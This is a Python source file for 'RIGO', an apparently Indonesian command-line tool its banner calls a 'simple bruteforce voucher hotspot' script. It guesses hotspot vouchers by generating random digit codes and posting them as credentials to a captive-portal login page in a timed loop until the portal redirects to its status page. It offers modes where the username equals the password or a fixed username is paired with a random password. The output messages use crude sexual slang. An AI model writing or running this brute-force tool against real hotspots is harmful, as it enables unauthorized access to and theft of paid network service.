# Self Making with ❤ by Ubaii ID
# Thanks to : stackoverflow, My Family, Allah.

# IMPORT MODULE
import requests as req
import urllib.request as ul
import urllib.error as er
from urllib.parse import urlparse
import random,time,os,sys,configparser

# COLOR LIBRARY
class c:
	purple = '\033[95m'
	ob = '\033[94m'
	oc = '\033[96m'
	og = '\033[92m'
	warn = '\033[93m'
	error = '\033[91m'
	n = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

def restoreSettings():
	settingsData = '''
[rigo]
debugMode = true
voucherDigitNumber = 5
nomorTogel = 23456789
loginPage = login
statusPage = status
maxLogin = 1000
checkUpdate = true
useProfile = false
selectedProfile = null'''
	settingsFile = 'settings.ini'
	if os.path.exists(settingsFile):
		os.remove(settingsFile)
		touch = open()
		touch.writelines(f'{settingsData}\n')
		touch.close()
	else:
		os.remove(settingsFile)
		touch = open(settingsFile, 'a+')
		touch.writelines(f'{settingsData}\n')
		touch.close()


def cls():
	command = 'clear'
	if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
		command = 'cls'
	os.system(command)


def banner(d,ver):
	cls()
	print(f'''{c.og}
		RIGO
 =-------------------------------=
 SIMPLE BRUTEFORCE VOUCHER HOTSPOT
 =-------------------------------={c.oc}
 Version : {ver}
 Debug Mode : {d}{c.oc}
 github.com/ubaii/rigo{c.n}''')

def validating(target):
	data = urlparse(target)
	path = data.path
	cek = data.scheme
	if cek == '':
		return False
	elif path == '':
		return False
	else:
		return True

def redirectCheck(target, loginPage, statusPage):
	resp = ul.urlopen(target, timeout=2)
	if resp.geturl() == target+loginPage:
		return 'OK'
	elif resp.geturl() == target+statusPage:
		return 'DL'
	else:
		return resp.geturl()

def udpMode(loginPage, statusPage, maxLogin, d):
	banner(d,ver)
	print(f'''
 [{c.ob}-{c.n}] MODE : Username & Password
 [{c.ob}-{c.n}] Silahkan masukkan url target.
 [{c.ob}-{c.n}] contoh huruf keberuntungan : mres.
 [{c.error}!{c.n}] Harap gunakan HTTP/HTTPS dan "/" dibelakang.
	''')
	target = input(f' [{c.ob}~{c.n}] URL Target ~> ')
	lucky = input(f' [{c.ob}~{c.n}] Huruf Keberuntungan ~> ')
	target_validate = validating(target)
	targets = target+loginPage
	if target_validate is True:
		target_status = ul.urlopen(target, timeout=1).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(maxLogin)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target,loginPage,statusPage)
				if redirectValidate == 'OK':
					rand = grand(digit,nt)
					file1 = open('data/'+digit+'-'+nt+'.txt', 'a+')
					file1.writelines(f'{rand}\n')
					file1.close()
					data = {'username': lucky, 'password': rand}
					x = req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] crott -> [{lucky} & {rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} tidak ditemukan.')
			print(f' [{c.error}!{c.n}] Pastikan anda telah terkoneksi ke jaringan hotspot.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} tidak valid.')
		print(f' [{c.error}!{c.n}] Pastikan menggunakan http/https dan diakhiri dengan tanda /.')
		exit()

def grand(digit, nt):
	rand = ''
	for i in range(0,int(digit)):
		rand+= random.choice(nt)
	filerandom = 'data/'+digit+'-'+nt+'.txt'
	count = 0
	dataNum = []
	for data in filerandom:
		count += 1
		dataNum = data.strip()
	if rand in dataNum:
		rand = grand(digit, nt)
	return rand
	filerandom.close()

def udpStart(target, udpUser, digit, nt, loginPage, statusPage, maxLogin):
	lucky = udpUser
	target_validate = validating(target)
	targets = target+loginPage
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(maxLogin)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target,loginPage,statusPage)
				if redirectValidate == 'OK':
					rand = grand(digit,nt)
					file1 = open('data/'+digit+'-'+nt+'.txt', 'a+')
					file1.writelines(f'{rand}\n')
					file1.close()
					data = {'username': lucky, 'password': rand}
					x = req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] crott -> [{lucky} & {rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} tidak ditemukan.')
			print(f' [{c.error}!{c.n}] Pastikan anda telah terkoneksi ke jaringan hotspot.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} tidak valid.')
		print(f' [{c.error}!{c.n}] Pastikan menggunakan http/https dan diakhiri dengan tanda /.')
		exit()

def uspMode(loginPage, statusPage, maxLogin,d):
	banner(d,ver)
	print(f'''
 [{c.ob}-{c.n}] MODE : Username = Password
 [{c.ob}-{c.n}] Silahkan masukkan url target.
 [{c.error}!{c.n}] Harap gunakan HTTP/HTTPS dan diakhiri dengan tanda "/"
	''')
	target = input(f' [{c.ob}~{c.n}] URL Target ~> ')
	target_validate = validating(target)
	targets = target+loginPage
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(maxLogin)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target,loginPage,statusPage)
				if redirectValidate == 'OK':
					rand = grand(digit,nt)
					file_random = 'data/'+digit+'-'+nt+'.txt'
					filerandom = open(file_random, 'a+')
					filerandom.writelines(f'{rand}\n')
					filerandom.close()
					data = {'username': rand, 'password': rand}
					x = req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] crott -> [{rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} tidak ditemukan.')
			print(f' [{c.error}!{c.n}] Pastikan anda telah terkoneksi ke jaringan hotspot.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} tidak valid.')
		print(f' [{c.error}!{c.n}] Pastikan menggunakan http/https dan diakhiri dengan tanda /.')
		exit()

def uspStart(target, udpUser, digit, nt, loginPage, statusPage, maxLogin):
	target_validate = validating(target)
	targets = target+loginPage
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(maxLogin)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target,loginPage,statusPage)
				if redirectValidate == 'OK':
					rand = grand(digit,nt)
					file_random = 'data/'+digit+'-'+nt+'.txt'
					filerandom = open(file_random, 'a+')
					filerandom.writelines(f'{rand}\n')
					filerandom.close()
					data = {'username': rand, 'password': rand}
					x = req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] crott -> [{rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} tidak ditemukan.')
			print(f' [{c.error}!{c.n}] Pastikan anda telah terkoneksi ke jaringan hotspot.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} tidak valid.')
		print(f' [{c.error}!{c.n}] Pastikan menggunakan http/https dan diakhiri dengan tanda /.')
		exit()

def home(digit, nt, loginPage, statusPage, maxLogin, d, ver):
	banner(d,ver)
	print(f'''
 1. Username = Password
 2. Username & Password
 {c.ob}==========================={c.n}
	''')
	mode = int(input(f' [{c.ob}~{c.n}] Pilih Mode~> '))
	if mode == 1:
		uspMode(loginPage, statusPage, maxLogin,d)
	elif mode == 2:
		udpMode(loginPage, statusPage, maxLogin,d)

def profile(selectedProfile,d):
	banner(d,ver)
	print(f'''
 {c.og}MENGGUNAKAN FITUR PROFILE MODE!{c.n}
 Profile digunakan : {c.og}{selectedProfile}{c.n}	
 {c.ob}==========================={c.n}
	''')
	# GET PROFILE SETTINGS
	try:
		read = configparser.ConfigParser()
		read.read('profile.ini')
		target = read[selectedProfile]['target']
		mode = read[selectedProfile]['mode']
		udpUser = read[selectedProfile]['udpUser']
		digit = read[selectedProfile]['voucherDigitNumber']
		nt = read[selectedProfile]['nomorTogel']
		loginPage = read[selectedProfile]['loginPage']
		statusPage = read[selectedProfile]['statusPage']
		maxLogin = read[selectedProfile]['maxLogin']
		if mode == 'usp':
			uspStart(target, udpUser, digit, nt, loginPage, statusPage, maxLogin)
		elif mode == 'udp':
			udpStart(target, udpUser, digit, nt, loginPage, statusPage, maxLogin)
		else:
			print(f' [{c.error}!{c.n}] Mode tidak diketahui! mode selected : {mode}')
			exit()
	except(KeyError) as e:
		print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
		print(f' [{c.error}!{c.n}] Pastikan penulisan pada profile.ini sudah benar!')

def profileSelector(digit, nt, loginPage, statusPage, maxLogin, d, ver, checkRigo, useProfile, selectedProfile):
	if debugMode == 'false':
		try:
			d = f'{c.error}OFF'
			profile(selectedProfile,d)
		except(SystemExit):
			print(f' [{c.error}!{c.n}] Pengencrotan selesai.')
		except(ValueError):
			print(f' [{c.error}!{c.n}] Kesalahan input.')
		except(KeyError):
			print(f' [{c.error}!{c.n}] Pastikan anda sudah menginstall seluruh module.')
		except(RecursionError):
			print(f' [{c.error}!{c.n}] Gagal ngehamilin bro:(')
		except(KeyboardInterrupt):
			print(f'\n [{c.error}!{c.n}] Keluar secara paksa.')
		except(er.URLError) as e:
			print(f'\n [{c.error}!{c.n}] Gagal menghubungkan ke target.')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah terhubung ke jaringan hotspot.')
		except(FileNotFoundError):
			print(f' [{c.error}!{c.n}] ada file yg hilang, silahkan download ulang!!')
			exit()
		except (req.ConnectionError, req.Timeout) as e:
			print(f' [{c.error}!{c.n}] Target tidak ditemukan/server dimatikan!!')
		except(Exception) as e:
			print(f'\n [{c.error}!{c.n}] Kesalahan tidak diketahui.')
	else:
		try:
			d = f'{c.og}ON'
			profile(selectedProfile,d)
		except(SystemExit) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Pengencrotan selesai.')
		except(ValueError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Kesalahan input.')
		except(KeyError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah menginstall seluruh module.')
		except(RecursionError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Gagal ngehamilin bro:(')
		except(KeyboardInterrupt) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f'\n [{c.error}!{c.n}] Keluar secara paksa.')
		except(er.URLError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f'\n [{c.error}!{c.n}] Gagal menghubungkan ke target.')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah terhubung ke jaringan hotspot.')
		except(FileNotFoundError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] ada file yg hilang, silahkan download ulang!!')
		except (req.ConnectionError, req.Timeout) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Target tidak ditemukan/server dimatikan!!')
		except(Exception) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f'\n [{c.error}!{c.n}] Kesalahan tidak diketahui.')

def rigoMain():
	if debugMode == 'false':
		try:
			d = f'{c.error}OFF'
			home(digit, nt, loginPage, statusPage, maxLogin, d, ver)
		except(SystemExit):
			print(f' [{c.error}!{c.n}] Pengencrotan selesai.')
		except(ValueError):
			print(f' [{c.error}!{c.n}] Kesalahan input.')
		except(KeyError):
			print(f' [{c.error}!{c.n}] Pastikan anda sudah menginstall seluruh module.')
		except(RecursionError):
			print(f' [{c.error}!{c.n}] Gagal ngehamilin bro:(')
		except(KeyboardInterrupt):
			print(f'\n [{c.error}!{c.n}] Keluar secara paksa.')
		except(er.URLError) as e:
			print(f'\n [{c.error}!{c.n}] Gagal menghubungkan ke target.')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah terhubung ke jaringan hotspot.')
		except(FileNotFoundError):
			print(f' [{c.error}!{c.n}] ada file yg hilang, silahkan download ulang!!')
			exit()
		except(Exception) as e:
			print(f'\n [{c.error}!{c.n}] Kesalahan tidak diketahui.')
	else:
		try:
			d = f'{c.og}ON'
			home(digit, nt, loginPage, statusPage, maxLogin, d, ver)
		except(SystemExit) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Pengencrotan selesai.')
		except(ValueError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Kesalahan input.')
		except(KeyError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah menginstall seluruh module.')
		except(RecursionError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Gagal ngehamilin bro:(')
		except(KeyboardInterrupt) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f'\n [{c.error}!{c.n}] Keluar secara paksa.')
		except(er.URLError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f'\n [{c.error}!{c.n}] Gagal menghubungkan ke target.')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah terhubung ke jaringan hotspot.')
		except(FileNotFoundError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] ada file yg hilang, silahkan download ulang!!')
		except(Exception) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f'\n [{c.error}!{c.n}] Kesalahan tidak diketahui.')

def checkInternetConnection():
	print(f' [{c.error}!{c.n}] mengecek internet..')
	url = "http://google.com/" # ganti aj kalo mw
	timeout = 5
	try:
		request = req.get(url, timeout=timeout)
		return 'true'
	except (req.ConnectionError, req.Timeout) as exception:
		return 'false'

def checkRigoUpdate():
	print(f' [{c.error}!{c.n}] mengecek update...')
	try:
		r = req.get("https://raw.githubusercontent.com/Ubaii/rigo/main/ver.txt", timeout=5)
	except(req.ConnectionError, req.Timeout) as e:
		print(f'[{c.error}!{c.n}] Waktu menunggu sangat lama, menghiraukan.')
		rigoMain()
	if r.text != ver:
		print(f'''
 [{c.error}!{c.n}] Update tersedia.
 [{c.ob}-{c.n}] Versi saat ini : {c.error}{ver}{c.n}
 [{c.ob}-{c.n}] Versi terbaru : {c.og}{r.text}{c.n}
	''')
		ask = input(f' [{c.ob}~{c.n}] apakah ingin update terlebih dahulu? (y/n) ')
		if ask == 'y':
			print(f' [{c.error}!{c.n}] aplikasi ini belum bisa mengupdate dirinya sndiri:(')
			print(f' [{c.ob}-{c.n}] silahkan clone ulang / download yang versi terbaru.')
			exit()
		elif ask == 'Y':
			print(f' [{c.error}!{c.n}] aplikasi ini belum bisa mengupdate dirinya sndiri:(')
			print(f' [{c.ob}-{c.n}] silahkan clone ulang / download yang versi terbaru.')
			exit()
		else:
			rigoMain()
	else:
		print(f' [{c.ob}-{c.n}] tidak ada update tersedia.')
		rigoMain()

def essentials(digit, nt, loginPage, statusPage, maxLogin, d, ver, checkRigo, useProfile, selectedProfile):
	internet = checkInternetConnection()
	if internet == 'true':
		if checkRigo == 'true':
			print(f' [{c.error}!{c.n}] auto cek update nyala..')
			try:
				checkRigoUpdate()
			except:
				rigoMain()
		else:
			rigoMain()
	else:
		rigoMain()

if __name__ == "__main__":
	try:
		read = configparser.ConfigParser()
		read.read('settings.ini')
		debugMode = read['rigo']['debugMode']
		digit = read['rigo']['voucherDigitNumber']
		nt = read['rigo']['nomorTogel']
		loginPage = read['rigo']['loginPage']
		statusPage = read['rigo']['statusPage']
		maxLogin = read['rigo']['maxLogin']
		checkRigo = read['rigo']['checkUpdate']
		useProfile = read['rigo']['useProfile']
		selectedProfile = read['rigo']['selectedProfile']
		d = debugMode
		try:
			with open('ver.txt') as verr:
				ver = verr.read()
		except (FileNotFoundError):
			print(f' [{c.error}!{c.n}] file ver.txt tidak ada!!')
			exit()
		if useProfile == 'true':
			profileSelector(digit, nt, loginPage, statusPage, maxLogin, d, ver, checkRigo, useProfile, selectedProfile)
		else:
			essentials(digit, nt, loginPage, statusPage, maxLogin, d, ver, checkRigo, useProfile, selectedProfile)
	except(FileNotFoundError):
		print(f' [{c.error}!{c.n}] file settings.ini tidak ditemukan!!')
		print(f' [{c.error}!{c.n}] mengembalikan seperti semula..')
		restoreSettings()
	except(KeyError):
		print(f' [{c.error}!{c.n}] Ada yang salah pada file settings.ini !!')
		print(f' [{c.error}!{c.n}] mengembalikan seperti semula..')
		restoreSettings()
	except Exception as e:
		print(f' [{c.error}!{c.n}] Error: {e}')
		print(f' [{c.error}!{c.n}] keluar.')
		exit()